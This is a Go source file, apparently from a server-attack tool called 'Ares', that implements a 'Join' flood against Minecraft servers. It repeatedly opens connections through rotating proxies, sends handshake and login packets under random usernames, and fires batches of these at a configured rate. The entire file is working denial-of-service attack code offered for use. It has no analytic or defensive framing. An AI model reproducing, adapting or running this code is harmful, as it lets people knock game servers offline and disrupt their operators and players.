package methods

import (
	"Ares/core"
	"Ares/net/minecraft"
	"Ares/net/minecraft/packet"
	"Ares/utils"
	"Ares/utils/mcutils"
	"fmt"
	"net"
	"strconv"
	"time"
)

type Join struct {
	Config          *core.AttackConfig
	isRunning       bool
	handshakePacket packet.Packet
}

func (j *Join) Start() {

	ip, port, err := net.SplitHostPort(j.Config.Host)
	if err != nil {
		fmt.Println(err)
		return
	}
	iport, err := strconv.Atoi(port)
	if err != nil {
		fmt.Println(err)
		return
	}

	j.handshakePacket = mcutils.GetHandshakePacket(ip, iport, j.Config.Version, mcutils.Login)

	j.isRunning = true

	done := make(chan struct{})

	for i := 0; i < j.Config.Loops; i++ {
		j.loop(done)
	}
}

func (j *Join) loop(done chan struct{}) {
	ticker := time.NewTicker(j.Config.Delay)
	defer ticker.Stop()
	for {
		select {
		case <-ticker.C:
			for i := 0; i < j.Config.PerDelay; i++ {
				go j.connect()
			}
		case <-done:
			return
		}
	}
}

func (j *Join) connect() {
	conn, err := minecraft.DialMc(j.Config.Host, j.Config.ProxyManager.GetNext())
	if err != nil {
		return
	}
	conn.WritePacket(j.handshakePacket)
	conn.WritePacket(mcutils.GetLoginPacket(utils.RandomName(10), j.Config.Version))
	defer conn.Close()
}

func (j *Join) Stop() {
	j.isRunning = false
}
